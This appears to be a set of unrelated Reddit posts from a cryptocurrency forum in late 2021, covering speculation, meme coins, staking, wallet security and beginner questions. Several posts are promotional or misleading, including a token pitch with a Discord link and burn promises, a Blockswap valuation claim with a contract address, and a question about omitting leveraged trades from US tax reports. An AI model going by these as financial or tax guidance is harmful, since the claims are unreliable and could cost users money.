Just going to throw this out here I am not a crypto trader fully more into stocks but rumors swirling around that GME and loopring are connecting. Dont care much if its true or not but with that kind of chatter and that kind of meme potential could rocket this thing. Buy the rumor type play. If it is true will definitely rocket just based on the hype. Just looking at what yall think. I through $500 in it today willing to lose it but I believe that this will keep rising based on the rumor alone and the risk reward is that I lose 50 percent or I could gain $3000+. What do yall think again not much of a crypto trader but understand that crypto sometimes just goes up based on chatter and social media. Like shibu skyrocketed based off momentum and social media.

I'm hoping that either CRO, ONE, MATIC or ALGO will be seeing (further) huge gains when Alt Season really kicks off shortly. Also looking to see ETH, CKB and FTM set new highs.

Antnbery serious and unexpected bad news aside (China crypto ban anyone), November is traditionally the real crypto Christmas before actual Christmas and we want to buy lots of nice things for our loved ones with our heavier bags come December.

If you had just spin of the roulette wheel in the crypto casino, which token or coin do you think will see the single largest percentage gain in the next 30 days?

Winner to be announced... in 30 days.

Good luck everyone and I hope you all see stellar returns!

I was at a Bruins game yesterday and looked up and saw this banner ad. It was incredibly surprising but still great to see! Its the first time Ive seen any crypto currency advertisement (aside from Doge and any meme coin ads). Hopefully this brings crypto currency to more people or at least gets more people talking about it. 

Maybe it wont reach a huge amount of people (I dont tend to look at the Garden banner ads too often) but its always great to see crypto be spread to new audiences. 

I hoping ads like this soon become the norm and not that uncommon. 

Crazy thought, but it might mean we could see Algo be accepted as a form of payment for tickets or concessions at Bruins or Celtics games!

So goddam stop idolizing people who predicted shit. It is not that hard if I say the entire crypto space is gonna implode in the middle of next year I probably have a chance of about 1 to five that this is actually true (historically speaking) if this turns out to be true I am not a crypto genius I just made a bold assumption based on some very lackluster knowledge. It really is not impressive it is just a game of chance. There are millions of crypto enthusiasts who all have vague opinions of where the graph might move when. Of course some of them will be right, some will even be right multiple times in a row but that does not make them a good source of information it only makes them lucky.

What would be the most secure and cost efficient way of converting ETH and BTC on a ledger wallet to USDC also to be kept on the same ledger wallet?

I think I can use a swapping service provided by the ledger wallet but I would guess there is a loss due to a spread?

Does it make more sense to send ETH and BTC to coinbase or kraken, sell for USDC there, then withdraw back to my ledger? 

Ive been a longtime HODLer of ETH and BTC and have never sold for USDC which is why I dont know the answers to my questions. Thank you!

I mean the fact that prices went up doesn't hurt either lol.

I used to check the charts at least every 30 min to an hour. Even at 3am on the toilet.

I would even get anxiety simply from reading something about crypto.

Then... truthfully I got overwhelmed and then I eventually got bored.

Best thing that could have happened.

I looked for the 1st time again today and just had a different feel. 

It was nice to see the numbers but I didn't feel any FOMO or FUD...

 I'm in for the long term. In fact I've decided to never cash out but to use crypto for purchases 10-15 years from now.

I enjoy reading about crypto more. Learning about projects and the technology.

Gets bored was the best thing that could have happened.

I understand some coins have serious utility, but let's be honest, 99% of us are not actually spending them.

And then there are some that don't even have utility at all. They are basically used as a Ponzi scheme for people to get rich.

I ain't complaining but I can't help but wonder, it seems like exactly the kind of thing most governments would stamp out in a heartbeat as it breaks the system of keeping the poor poor.

That's all I really wanted to say but text posts require a 500 character limit so let me elaborate, text beyond this point you don't need to read though.

Bitcoin and Ethereum I understand have genuine utility. And then there are a few other ones like Cardano, Stellar, Solana etc that have their own specialised purpose. These ones can obviously justify their existence as a valid currency. 

But what about the countless shitcoins which have no utility and maybe won't ever? And hey, no hate, I own several. But just curious.  For e.g. Shiba doesn't really have any specialised utility other than it has now been so widely adopted that some retailers accept it purely so they can invest themselves. By and large, Shiba is merely the biggest example of making poor people rich. So how have governments not made it illegal? And again, no hate, I've enjoyed the gains too.

Is crypto becoming illegal in the future something we should consider?

There's soooo much hype right now. And the direction of most pain is that next week, we get a big anti crypto thing and all the new folks on SHIB and legit projects get hit HARD. 

/////////////////////////////////////////////////////

The market loves to punish. 


Whats your plan currently?

Do you feel like people are too hyped up for this to not crash hard?

Maybe I'm thinking too hard on it. 

It's impossible to predict, but we try right? 

Worst case, I just get LESS gains on my speculatives. Best case, I'll lose less from going the more traditional route with the investment. 

Seriously, love chatting with you all.

It now seems like people will buy anything and everything that has a popular name or meme behind it. I still remember the day when I bought a bunch of SHIB and people were visibly disgusted on the thought of it. Now the same thing happened to me with these people who are buying squid game tokens. It seems like I have reached a seniority in sh*itcoin space.
What do people think when they buy these kind of meme and sh*t coins. *smh*. It's like they are not even doing a little bit of research and just put to make quick money. They don't even understand the basics of crypto and are ruining the market for everyone.

I know the answer, or at least I think I do. 

My understanding of it all points to Monero as being top dog, but there's literally several dogs above it. 

I would love to hear what the point of cryptocurrency is, in a way that doesn't sound like a sales pitch for Monero. 

Crypto means hidden: monero is hidden. 

Decentralization is not the goal, but a means to the goal of being uncensorable, to not be controllable by regulators, politicians, whatever. 

Centralized services can be shut down or manipulated by law enforcement or otherwise. 

Decentralization isn't as  efficient or adaptable to a centralized version. So what's the point if not being uncontrollable by the powers that be?

what's the point of cryptocurrency in a way that doesn't sound like a sales pitch for Monero?

Not sure why I'm even posting this, I guess the world is changing.   


I'm a crypto boomer, been in it since 2011, still broke. Back in my day I was spending multiple bitcoins on stupid shit, unlocking my xbox, buying cracked software on the deep web and god knows what else. I mined LTC and ETH from day 1. I was a teenager broke as shit but using my ETH and LTC to buy steam games from people on reddit, looking back I paid $14,000 for a copy of Rust in todays ETH prices.   


I lost enough Doge to retire in the Cryptsy hack, I didn't care at the time because it was worthless then. I've given away tens of thousands in ETH that were worth nothing at the time to people I don't speak to any more. I've been through all the ETH, ZCL forks, the creation of CVC, the ICO boom, I've seen it all boys.   


I'm still broke as shit, looking back at my transactions I would be a multimillionaire if I held just a little bit of what I've spent.   


The main reason I'm posting this is just my amazement of how the crypto game has changed. I was an old head, die hard BTC, ETH, LTC. Needing a good laid out whitepaper up front, needing to know who's making the coin, who their mom and dad are before I even thought about buying it. Full on TA, cup and handle, trendline, support, buy wall, all that. I'll tell you right now, anyone still doing that, take it all and shove it, this is a new game now. I just made more money off a meme coin in a week, that I wont name because I'm not trying to shill shit, than I've made in the past 10 years. Nothing matters any more, there's no fundementals, buy baby moon safe ultra whateverthefuck token with a low market cap and wait a week.   


Rant over.... I don't want your moons either before someone goes down that rabbit hole, not sure how my wallet even got enabled on here.

I'm a new investor and only recently I've been learning about market cycles and trends, there's so much to learn! One things that has become apparent is there are models and patterns that savvy investors have seen over the years; and although the crypto universe is the wild wild west and anything can happen - some of you seem to get it right, time and time again!

The last few months of crypto have been crazy and that's an understatement. I only started my crypto journey in May and it began with me watching a complete sea of red for my first few months investing.  The helpful people of this sub taught me not to panic and helped me forge my diamond hands. Reddit has been my home through this journey and I've learned so much about investing, and I'm oh so thankful for it.

\- You told me to DCA in and hold my bags for incoming pumps mid-year... which came and turned my sadly all-red folio into a nice green.  
\- You told me to be wary of September as its traditionally a bad month for crypto...which was correct. I took my profits early and held....waiting for October.  
\- You told me that October would bring pumps like we'd never seen... and many ATH were broken. Pumptober was beautiful, and a nice insight into what a "bull market" is like.  
\- Only thing that has been *wrong* so far is that you told me to be wary of SHIBA and I missed out on 10x'ing my money.

So I ask, oh wise members of the cryptocurrency sub.... what should I come to expect from November?

A giant sell-off after Pumptober? MORE pumps? A new dog-themed coin in the top 10? I'd like to acknowledge that it is fair to say we don't know shit about fuck, but I'm very interested in what you guys have to think!

On may 18th 2021 the Bitcoin bulls, and all crypto bulls were dumped on. The entire market got dumped on harder than John McAffee on a summer night. With the exception of a few coins, among which was AXS. It pumped like a beast, ignoring the decimation.

Is this because it has a use case that provides an income stream outside of the crypto ecosystem? The number of players active, or the growth thereof seems even more relevant than the crypto markets overall performance on the price of cryptos like AXS. Any opinions on weather or not thats whats happening here?

Given this example, might it be worth hodling gaming tokens when cashing out on alts in the coming final months of the cycle? 

Also, any gaming tokens worth looking into? Tell us why you think whatever you mention is good, please dont just shill your bags cause youre holding them. Maybe mention how theyve done for you, and weather youve had them days weeks months or more.

Ive dipped the wick in some AXS (done great) TLM (aint done shit) TVK ( 2x but stagnating for a long ass time) SAND (done great) had all for several months, bought the big dip between may and july.


Cheers!

Ill admit I understand zero about the technology behind cryptocurrency. Someone might as well be speaking a completely different language to me. You all seem very knowledgable about it though and, arguably more important, passionate. What I think I understand, and Id appreciate you correcting me if Im wrong, is the basic principle of Bitcoin is to be a decentralized currency (which I can get behind for a variety of political and moral beliefs) Ethereum is similar but also a platform of sort for other technologies. So, also a serving force and though not a brick and mortar, tangible product, a product nonetheless.

What I dont understand at all are the memecoins like all the attention the SHIB coin is getting. Is its only value that people say it has value? Is there any other point or product its aiming to achieve? And if there isnt, then why would someone chose to invest in something like that rather than the first two who do seem to have a planned objective outside of just existing?

Im not asking for any financial advice. Im just very curious (on a dumbed down scale please)

I've been bullish on Solana for some time, and I've seen it rising for most of the year. 

A few weeks ago, it flipped Ripple (XRP) for total marketcap. It currently sits in 6th spot at about $62.3b, with Cardano in 5th at $65.5b.  ([source:](https://coinmarketcap.com/) This is sure to change again by the time I post this). 

&amp;#x200B;

[Coinmarketcap](https://preview.redd.it/lcp2l45xxvw71.png?width=1745&amp;format=png&amp;auto=webp&amp;s=e56241e2912a0d0fe3916c26ab23e9616e19721c)

One of the biggest influences on the rise has been the adoption by developers. The insanely fast speeds and near zero fees have made it a lucrative option for the development of a number of projects. 

You may not have noticed the steady climb among the meme coin phenomenon, but I don't believe it is very likely that those coins will hold their positions for very long. Once the memes are gone, you'll have to revert back to reliable projects. Good luck in whichever coin(s) you are backing!

So my understanding of mining pools is that a group of people pool their hashrate in order to share the block reward evenly. However, this is a huge problem especially with bitcoin since the 3 biggest mining pools at the moment if combined would control over 51% of the hash power thereby leaving the network open to a 51% attack. How is this not an issue with staking pools for proof of stake blockchains? If for example I choose to stake in a pool that has over 51% of the total crypto available then the operator of the pool can in theory go rogue with my coins and choose to validate bad blocks which would destroy the currency. I've seen some articles saying that controlling 51% of all the available coins is very hard to do since it would be very expensive but doesn't this assume everyone is operating their own pool? If people decide to pool their stake together it seems pretty easy for one pool operator to control 51% at least imo?

I've been hodling ETH for a couple of months, so I'm definitely happy with the recent bull market and all the attention crypto's been getting. Naturally, I want to try and diversify my portfolio, and I keep on reading about Cardano whenever I try to research. I don't quite understand the hype though. 

I know that an Ethereum co-founder created Cardano, and it wants to have a more academic approach to the blockchain space (if my understanding is correct). But I'm not sure if there's more I should see to understand what makes it so exciting for investors. Is ADA really worth staking or am I better off just continuing my hodling ETH? If not Cardano, should I try another platform or blockchain? Thanks!

Obviously shib has mooned this month and anyone holding decentraland is doing well too as well as some others. 
Btc been doing its pump and correction the last couple of weeks 

Got me thinking this alt season is interesting. Historically its been a good time of year for btc coming up but I feel like we may see a price correction due to the impending economic recession and inflation. If an ETF spot hits the market then it will obviously pamp which will cause Alts to pamp as well. 

But then again nothing makes sense bc shib is making ppl rich. 

So my guess is the the inflation will continue and the alt season will end and btc will moon to ath before end of year. 

If you made it this far in my mindless rant why?

In the Past Meme Coins were all on pure faith, no social media presence, barley any communication with the teams behind the coin, and No immediate or use cases within at least a couple of months.

But Coins like Pussy Coin and Shiba at least have Staking. Even NFT's come off a bit scammy but offer something besides just talk.

Any coins that provide something besides just a whitepaper, a twitter, and momentary hype leave the realm of meme for me. Anything can happen.

Ill accept Meme Coins V2 but lets not act like they are the same thing as the rug pullers of the past.

I am super excited for this project everyone. I got in the day it dropped as a bep20 token a little under two weeks ago. We are making major improvements and putting our hard earned money in to make this an awesome coin. we just launched our erc20 token today. Yes the gas fees might be higher but it is worth it to become a higher quality token and more main stream with huge potential. We currently have 1 quadrillion coins in supply but once we have 20k holders we will burn 50% of the token and this token also has a burn rate so every time someone sells it burns automatically and the holdrs will get 1% of what sold just by holding your token and it goes straight to your wallet. Join our discord for more information and join the movement!!! [https://discord.gg/hCEbfaYptG](https://discord.gg/hCEbfaYptG)

Could someone explain what a moon is?  As far as i know, it looks like it's a way to monetize karma in this subreddit but how exactly does it work?  I saw that there is an event scheduled for the 3rd, which coincidentally happens to be my birthday and I would like to know how this distribution of these points works.  Until then, I've been looking at this subreddit's posts as a lurker and haven't been here for that long.  Sorry if this sounds like some sort of newbie stuff but my crypto wallet is still insignificant compared to the ones I see and I'm interested in the opportunities I can find here

Hello Reddit family,

For the most part, I stay in the shadows investing and learning as much as my time and income can afford me. I dont claim to know every minute cryptographic detail about blockchain and crypto as a whole, but Ive been in the game long enough (August 2016) to know a thing or two about catching long term projects and coin analysis. 

Lately, Ive been seeing an uptick in shitcoins being the reason that most people come into crypto, looking for quick monster gains that they can brag about at parties and such. Now dont get me wrong, I cant hate on how any man feeds his family, if I made money off of shitcoins, Id be more than through the roof; papa has some chunky bills to pay. Nonetheless, its tainting the whole concept of crypto, most dont even stay long enough to understand peer to peer network voting, DeFi lending, hot/cold wallets, or let alone how to connect their wallets across multiple platforms. 

I could try to blame the clickbait YouTubers, spam posts, and all that, but I think its important at these moments to remember that things are still being sorted out. New things are messy to regulate, especially when you have institutions and emotionless CEOs in the mix, it just wont stabilize easily. 

I remember when there were like 1,300 coins on Coinmarketcap and I thought, there are way too many coins in the space, we need a few strong ones to make noise. Now I dont even know what I can say about all the sh*t thats floating around, its too much. 

Cant blame the newcomers for going into the ELONs, or the SHIBs, talking about, I invested $20 and this YouTuber said that can make me a millionaire when it hits $1, no basic understanding of the fundamentals, its a shame. Its no wonder the banks are coming in advertising to the masses with these crypto cards, its a free-for-all market. 

Maybe wed have a more polished reputation if projects like Compound, Chainlink, or VeChain were placed in better educational packages alongside Bitcoin for the masses to digest. Maybe thats just wishful thinking and its best to contribute where you can and leave the rest up in the air. 

Who knows Ill do my part, but something smells foul in the crypto space. November-December is going to be an interesting timeframe to watch. Get your popcorn ready

First off Id like to state that I joined this crypto world around March this year. Made some good profits so far never pulled out just kept DCAing. Now Im no expert in crypto, but Im planning on btc hitting an all time high early Q1 of next year. Then eth follow after as-well alts following eth to their all time highs. My plan as of now is to stop DCAing into btc after 80k, then focus primarily on eth and alts. Then when btc hits around 150k sell and split into eth and alts. Around summer next year planning on selling everything to a stable coin like USDC, then buy back again btc, eth, and select alts when things settle back down again.

Is this a sound plan? Or am I gonna get slammed with taxes and better off just holding?

Had a power outage in my country and power kept tripping off in my house. Initially thought little of it even though its very uncommon.

Few hours later my miner bot notified me that my rigs were all shutdown. Hours of mining lost. Even then getting everything back up took time. 

Turns out there was a huge solar flare that affected all power supply in UK. Wonder how badly all mining networks have been affected.

I know my internet has also been on and off for a quite sometime amd mobile signal has been terrible.

Anyone else been affected?

So there are tons of decentralized exchanges these days, and they all have their own distinct flavor; so what I want to know is what do you want to see from a DEX that you haven't had already? 

I'm not sure personally, so I'm reaching out to the crypto friends (that I'm now realizing sounds like a lame super hero group) to see what you guys think. It's a multi billion dollar industry at this point, and definitely has a ton of room to grow. 

So what do you think? Y'all probably use DEXs more than pretty much any group of people, so most of you will likely have an opinion on the matter. 

Let me know kings and queens, 

Be love

[BlockSwap Network](https://www.blockswap.network) makes the benefits of staking accessible to everyone as a stable yield source through fixed income products, incentivizing existing staking operators and PoS token-holders by insulating everyday users from dealing with asset volatility and its staking processs complexities. When compared to its closet competitor, Lido, one can see how undervalued CBSN is: 

**Fully diluted market cap:**

* Blockswap (CBSN): $40M
* Lido (LDO): $3.4B
* **Staking:**
* Total staked on Blockswap: $3.3B
* Total staked on Lido: $8.5B
* **Community:**
* Blockswap twitter followers: 117K
* Lido twitter followers: 45K
* Blockswap telegram members: 20K
* Lido telegram members: 7K

Blockswap has roughly half the amount of staked assets, but a more robust tech stack and much stronger community than Lido. However, LDO is currently trading \~85X higher than CBSN. **I estimate Blockswap's intrinsic value to be around $1-$1.5B (FDMC) or 25X - 37.5X higher than where its currently trading.**  

CBSN contract (Erc-20): 0x7d4B1d793239707445305D8d2456D2c735F6B25B

On October 31st 2008 Satoshi Nakamoto published his bitcoin white paper. It received its first reply on November 2 from James A. Donald, who wrote back: "We very, very much need such a system, but the way I understand your proposal, it does not seem to scale to the required size." Bitcoin was later officially launched on January 3, 2009 when the genesis block was mined. Crazy to think that in only 13 short years from its publication it has had such success despite people always doubting it and saying it was "imaginary money".

I'm sure everyone had a fuckup in the world of crypto. Do you want to share yours?

My biggest fuckup was this:

Sold my website for 0.3 BTC back when one bitcoin was worth around $1200. The site wasn't doing great and I just wanted to get something out of it and get rid of it eventually. Stupid me decided on a Friday night that I'm better off with a new gaming monitor, and I don't really need the 0.3 BTC (was worth around $350 when I sold it.)

I'm not blaming myself because I couldn't have known what'll happen with crypto in the future, but damn that is one hell of an expensive monitor. 

P.S. I still have it somewhere in the basement, that son of a bitch.

itd be cool if r/cryptocurrency collectively could donate a big amount to the project?


https://teamseas.org for those who dont know, Mr Beast recently did a video where he cleaned up a bunch of trash on various beaches, he also put out a challenge to everyone watching to donate  to the charity fund who would match all of the donations 

[Vid](https://youtu.be/cV2gBU6hKfY)

basically hes trying to have 30 million dollars donated to eliminate 30 million pounds of trash, I think it would be cool if r/cryptocurrency could collectively raise a bunch of money and add it to the total. I think it would give cryptocurrency a really positive eye considering the usual negative view the public has regarding crypto

I've been moving some fiat into a savings account in anticipation of doing my self assessment tax return for the first time. It turns out I don't need to report this year, I'm ok until next year. So, I'm thinking of putting this money into stablecoins and popping them in CDC Earn to grow until I need them.  I'm looking at stablecoins as a low risk, low tax implication way of doing this.

Good idea? Any downsides?

Apparently this doesn't have enough characters. I mean if we had a character count I'd know that,  but we don't. So, to add, I'm quite happy with my portfolio. Everything except Nano is in profit. My Amp is sitting there, bring Amp. I went to a Korean BBQ last week, it was great.

Hi, I'm a 19yo who would love to get into crypto...I know nothing about any of this so honestly the thing I value the most rn is learning as much as I can.

For my birthday I got 100 to invest in crypto so that's my budget here.

I would just like to have from you as much information I can get to start, I'm especially interested in suggestions for websites, yt channels or even other specifical subreddits and sources that I can learn the most from.

Idk guys I just hope some guides me through all this...

I made a coinbase account in 2014 but didnt start buying crypto until April of this year -.-

Ive been interested in this industry for a long time but hesitated to jump in, which is a regret. However, I think were all still early to the game, especially with what seems like hundreds of projects popping up each week. 

If I had invested what Ive put in since April, in 2014. I would be a super duper millionaire. Time can only tell if the next 7 years will do the same

So far my main investments are XRP and Rarible

Before you say that all this is some kind of gambling, I want to tell you that I agree with you. 

But if cryptocurrencies are some sort of gambling, then shitcoins and memecoins are casinos. 

I am always happy when someone made money in trading cryptocurrencies, no matter if it was from trading with BTC, ETH or memecoins.  

Money is money and money sees no difference between BTC and some memecoin.

**I am not here to preach you about what you should do with your money, I am just stating my opinion.**

So good job to all of you who have succeeded in this, but I will continue to stay away from it.

Any gambling in my life has cost me dearly. 

I'm not someone who gambled with a lot of money, I would sometimes pay 10 euros for roulette, but for the last 10 years I haven't entered any casino.

So I will not go into this one either.

To the people who are trading with this I wish you all the best, without a shred of irony.

Enjoy your money youve made, **I am bad at it, so Ill stick to safer ways. My gains will come eventually.**

This is the first time we have had a monthly close over $61k previous monthly close was around $57,789.

Plan Bs stock to flow model also got invalidated

According to Stock to Flow model we were supposed to close monthly candle over $63K which was worst case scenario. His other two predictions were little ridiculous but in crypto you never what is going to happen.

Stock 2 Model predicted we will close November $98K and December over $135K if we close monthly any where near these prices I will lose it.

Hello guys, how do I know which network I can use to transfer my coins.
As I know not every network is compatible with every wallet, for example ledger nano.
But I could be wrong.

For the word count and also to spread awareness:
Never give away your seed phrase.
Many people want to scam you and get your seed phrase by sending you a link to connect your wallet or whatever.

Comment your favorit Pokemon.
Mine is Celebi
I like the way it travels through time.
I think it would do great with crypto because it could just travel back and invest in the best coins.

Best wishes,

Your crackbaby

I'm new to crypto. Registered on crypto.com and binance. I plan on keeping the crypto on the exchange. Are there any pros or cons to this? 

I've heard and read about staking crypto on this sub but I'm not sure what it is. As far as I understand it's like keeping your money in a savings account, right?

How does staking work? Is it just leaving your money in a wallet and you get a return on it? Also does the value of crypto in the wallet change with the market? Are the returns paid annually or monthly? 

Can someone explain what it is? Does binance allow it? What are some of the best coins to stake and where can you stake them?

Sorry if it seems like a lot of questions.

The bull run is here and it is time to see our portfolio go off the charts! I tend to get excited and would want to share my success with my friends or family. However, I try my best not to do that and contain my gains are there are for me to know only. 

We are going to have people making a 10x and some really fortunate individuals making 100x or more. I know one would want to share your gains with people you know but there have been stories where early adopters of BTC were robbed or mugged and asked for their seed phrases because they were talking about their holdings and/or their gains. 

I would never want anyone of us to go through that thus, please do yourself a favor and keep you and your crypto safe! 

Enjoy the bull run!

Hey everyone. I've been watching and reading about crypto-technology with interest on and off for a while and I think I'm ready to get more involved in terms of investing.

I'm looking to invest in cryptos that have promising projects that would increase global productivity in some way or solve real world problems. The key priority I'm looking for is full advantage of decentralization in some way.

I'm not interested in suggestions saying cryptos are useful in and of themselves as store of value as I've come to believe they're not. I'm also not interested in their uses as currencies in and of themselves.

Thanks in advance.

I'm not sure if this is the right place, I'm not trying to ask for someone to make this. But as I've realized the power of smart contracts, I can't help but think of the amazing opportunities this opens up. And here's an idea I'm particularly excited by.

The world of speed running is insane. Honestly, I am not a speed runner but I lurk some speed running communities and the challenges they set up for themselves are amazing. Speed running may sound very straight forward; complete the game as fast as you can. But the world of speed running is so much deeper.

For example, here are three types of speed runs.

Speed run Any% - This is where you complete the game's main objective as fast as possible. This is what most people think of when they here "Speed running"

Speed run 100% - This is where you complete literally every possible objective in the game as quickly as you can.

Speed run Low%- This is where you complete the main objective of the game while collecting as few of the objects in the game as possible. The highest priority is how few things you collect. So if Person A collects 8 items and completes the game in 2 hours, and Person B collects 7 items and completes the game in 15 hours, Person B is considered to have done the game "faster"

Here's a video that shows some of the creativity that goes into solving these sorts of problem in Twilight Princess

I'm getting so deep into the details, because the number of challenges this community makes is ridiculous. Just to beat a dead horse, here's a Super Mario 64 challenge where you have to run a script that forces you to hit the A button every frame, and the challenge looks grueling.

I'll really beat a dead horse Here's years of effort that went into beating a 14 year old Trackmania record.

Alright, now that all of the horses are dead, here's the idea. Individuals can create challenges and bounties for those challenges. People who want to complete that challenge pay an entry fee and can make an attempt to beat the challenge. Those who funded the bounty split the entry fee proportionally, and if the speed runner successfully completes the challenge they receive the bounty.

This gives a financial interest and passive income for people to create bounties, and gives a source of income speed runners interested in completing the challenges.

But wait, there's more. Maybe there are large, large bounties, with giant entry fees; 10 BTC bounty, with a .5 btc entry fee.

Players could have sponsor smart contracts. That if they can get funded, they split the bounty in a predetermined way upon success.

This idea creates a financial interest for people to create challenges for gamers. It creates a market for gamers to compete in, and it creates a market for people to identify sponsorable gamers, and make money funding their entrance into large challenges.

Alas, I don't believe this will exist any time soon. I don't possess the skills necessary to create such a marketplace, but I can't stop thinking about this idea.

I see some obvious challenges, like how to validate games played in what would normally be an off chain game. How do you make sure those playing aren't using mods, or cheating?

Regardless, it's a fun idea. Any thoughts on the concept?

Bitcoin is so cool, it could stop the ills of banking for good.   Since this is bitcoins birthday today, I think we should all consider ways to protect this digital gift from Satoshi.  So bere is one way I see traditional banking doing the rope-a-dope with bifcoin.

I've been reading "the creature from Jekyll island" and learning about central banking and their tools of operation.   One of a central banks tools is called fractional reserve lending.   This practice was "discovered" by blacksmiths back in the day whom people trusted to keep their jewelry safe.... but for a price.  But making money on holding valueables wasnt enough.  Blacksmiths, with their heavy vaults, soon found out they could use the stored jewelry as collateral for more money.  They just had to make sure not everyone wanted their jewlery back at the same time.... this "tool" is essentially fractional-reserve lending.   Just swap jewlery for gold reserves and you are ankle deep in how the federal reserve operates.  

So I was thinking about how banks could do this with  bitcoin... because, if you don't know yet, bitcoin is legit.  With the open ledger, it would be easy yo monitor fractional reserves of bitcoin.  This doesn't mean it can't happen though.  How would they do it?   In my mind, there are 4 ways banks could break bitcoin my fractional reserve lending.  

1) this could be done through a bank made DEFI platform-IF some smart-contracts through defi (now or in the future) could exploit bitcoin In fractional reserve lending.  

 2) If banks start acquiring bitcoin and have their own wallet.  So the recent news about Mastercard and banks is something veteran cryptoheads need to monitor.   Expect complex vernacular for "who owns the bitcoin" in legislation, contracts, and terms and conditions.  

3) if banks offer to hold your bitcoin like a medieval blacksmith because WaLlEtS are ToO CoMpLiCaTeD... WE'lL KeeP Ur CryPTo Safe.  They could easily cook the books with bitcoin.  

4) if banks take your private keys.  This is the most difficult way for the banks right now.... but what about in 50-60 years when we start aging and dieing...  What will happen to our private keys?  What about the microstrategy bitcoin vault?  Is Michael Saylor the only person that knows the private keys for Microstrategy?  Could the banks offer enough to someone to make them compromise any private keys?  

I don't know.... just some thoughts.

It was a group on telegram alot of people in that group, they did trade bitcoin and they did show proof they got their payment from their trader, the trader was friendly, he  did transfer the money to [www.blockoption.net](https://www.blockoption.net) but it seems I cant  take thouse money out, what group is this then?  And they did remove me from the group when they got their money? I did buy the first basic investment with the one with 500 dollar. But how can these seems so legit and be a scam too?

Many people who bought BTC a long time ago, have sold somewhere along the way. They could now be really rich, which probably hurts them more than if they had never bought.

But now you're in the same position with altcoins. Altcoins can still do a 10x, 100x, 1000x, depending on the marketcap. So let's say you sell something for a 2x and it would have been a 1000x. How would you feel about it?

And would it be better to just hold everything, because while some coins go to 0, some of them will definitely do a 10x. Would you be able to live with that? 

And imagine you make a 10x and you don't sell, but it goes back to 0. Would you be able to live with that? How do you balance these choices?

I have been into crypto for a little while but need some advice as a long term holder.  Currently I have a wallet (BRD) that I transfer my holdings to from Voyager exchange.  I have been looking into the Nano Ledgers but I feel like I could be doing better.

1.  I want to hold long term for certain investments.

2.  I like the ability to transfer from an exchange to my wallet.

Is there a good 1,2 punch for this type of investing?  I do like to quickly buy/sell on the exchange but I do purchase through my wallet as well.

With the fees associated from transferring Im looking for the best way to invest both short and long term.  

Sorry for being serious and posting this for advice but you guys are so smart on here.  

Let me know.

Thanks.

Hey nerds. I'm confused about how taxes and reporting trades works when using a platform like kucoin to make leverage trades in the US, and I don't want the IRS to come after me. (I know margin trading is risky, I'm only practicing with small amounts to see how I do). I'm a total noob with tax bullshit. 

So let me give an example and scenario. 

-I sent $1,000 to kucoin and used it to borrow $10,000 to perform trade. 

-The coin I bought explodes in price and I manage to make $5,000 off the trade. 

-I take my profits and send it to coinbase to withdrawal into my bank account, and report the sell on my taxes. 

-When I do my taxes using cryptotax trader, I don't include the kucoin trading data, but I do connect all my other exchanges where I made trades like coinbase, kraken, binance, etc, just not kucoin due to leverage use. Meaning I got the $5k from "somewhere" but still paid taxes on it. 


Here's my question. As long as I pay taxes on the $5,000 I withdrew to my bank account, but not the specific trades I made on kucoin to make that $5,000 with leverage, will I be okay in the eyes of the IRS? 

I'm confused how so many people are able to leverage trade in the US and not get fucked by the IRS for doing so if making huge profit. I've heard that as long as you pay taxes on the profit you made and withdrew to a bank account, the IRS is happy. 

I also don't understand how people manage to pay taxes and report trades when trading shitcoins on DEX's with no ability to generate reports or connect it to a cryptotax service, doing options on a platform like FTXUS, or getting gifts or free crypto from a twitter giveaway. 

Basically I just wanna make sure the IRS isn't gunna shit down my throat if I don't report my kucoin leverage trades individually, but I do report my withdrawal from coinbase to my bank account and pay taxes on the $5k made. 

Any help or insight is appreciated.

With new people coming here and getting involved in cryptocurrency, I thought it would be a good idea to go over some basic security tips for your crypto. It doesn't matter how much money you make if it ends up getting lost or stolen.

**EXCHANGES:**

You most likely are starting out on an exchange. You usually pay a bit more in fees, but it can be very easy to navigate for a new person. Make sure it is a reputable xchange, such as Coinbase, or Binance. You may have heard of horror stories of exchanges getting hacked. It happens less now, but happens even less on good exchanges.

However, you can still have the money taken if you fall victim to a scam, or if you personally are hacked. You should set up 2 Factor authentication with the exchange (2FA) to make it more difficult for someone to sign into the exchange as you. You could set it up so that the 2nd factor is your phone (meaning they would send a text to your phone when signing in to make sure it is you), but to be more secure you should have it set up separate from your phone with something like Google Authenticator.

**WALLETS:**

If you have a decent amount of money (maybe over $2000) I think you should have your crypto money in a wallet. Whether you use a software, or hardware wallet, you will get something called a "seed phrase". A seed phrase is a series of words generated by your cryptocurrency wallet that give you access to the crypto associated with that wallet. Two VERY important things related to this. Always have a physical copy of the seed phrase somewhere secure. If your house burns down and you can't access the wallet, if you don't have the seed phrase you are screwed. There's no customer service to contact. You simply can't access the crypto ever again.

Secondly, never give the seed phrase to anyone or have it in a place they could access/steal it. If they do, they can take your crypto and like the above example, there is nothing you can do about it. You can try and file criminal charges, but with crypto that is usually a dead end.

&amp;#x200B;

I hope these are helpful and probably things I forgot to mention.

Happy crypto journey new people!

Just wanted to make a quick post to inform or remind people that may not know that Bitboy Crypto has literally no idea what he is talking about. This wouldn't normally be a problem as none of us know shit about fuck when it comes to the crypto market, except he has the 2nd largest YouTube following and pretends he does know what he is talking about.

Well I'm sure most people are aware of his $2,500 ETH by Valentine's Day predicition. But some of you might not be aware that he so predicted that the whole bull run would have peaked and be over by 31st of October. 

As it's currently Halloween, I take a certain amount of pleasure in again proving that Bitboy fails in all his predictions. And remind people to stop giving the guy that dumps his positions on to his fans any more attention.

Enjoy your end of year gains folks.

Guys I am not sure if this is the right place for these questions. anyway

These questions about modern, new crypto currencies as Doge, Shiba, etc.

Do they normally have dedicated eco system being peer-to-peer payment system, have their server pools, like Bitcoin network? Or these "coins" are some kind abstractions which can be traded on crypto exchanges?

How do the new cryptos which work like bitcoin with their network and proof-of-work, protect from an attack of someone who has significant CPU power, who can re-do the proof-of-work rebuilding the block chain in the attacker favor?

Do the first coins appear from mining first blocks, or there are first transactions with some kind of initial deposits?

what other resource could you recommend about crypto for software developers?

Curious! What's the cheapest way to move funds from a cex to a wallet? Eth network fee is expensive!!!! 

I live in the USA and don't have access to binance but binance.us but currently us Coinbase pro because it's the easiest to use for me. I've tried crypto.com (seems expensive after the free month) but I can stake coins here. I've also used ftx.us (pretty limited on the amount of coins, but gives interest on sol, and poly). 

I currently use the Coinbase wallet. Have looked into metamask, and recently got a ledger s. (Not a huge fan so far cuz it's hard to stake) 

I've read from Reddit to use xlm to transfer between cex but how do I swap xlm to a erc token if I transfer from cex to wallet? 

